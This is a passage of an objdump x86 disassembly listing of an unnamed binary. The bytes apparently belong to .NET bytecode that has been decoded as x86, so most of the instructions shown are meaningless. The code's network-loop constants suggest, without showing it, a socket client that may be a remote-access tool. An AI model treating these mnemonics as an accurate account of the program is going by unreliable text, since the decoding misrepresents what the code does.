  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 0a 22 00       	and    $0x220a72,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 18                	jb     0x403092
  40307a:	22 00                	and    (%eax),%al
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 22 22 00       	and    $0x222272,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
